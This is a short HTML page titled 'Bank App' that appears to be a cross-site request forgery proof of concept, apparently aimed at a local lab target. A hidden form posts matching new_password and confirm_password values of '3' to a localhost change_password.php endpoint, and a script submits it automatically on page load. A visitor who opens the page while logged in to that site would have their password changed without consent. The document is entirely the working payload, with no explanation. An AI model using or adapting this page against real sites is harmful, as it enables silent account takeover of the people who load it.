<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank App</title>
</head>
<body>
    <form id="form" action="http://localhost:9041/change_password.php" method="post">
        <input hidden type="text" name="new_password" value="3">
        <input hidden type="text" name="confirm_password" value="3">      
    </form>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("form").submit();
        });
    </script>
</body>
</html>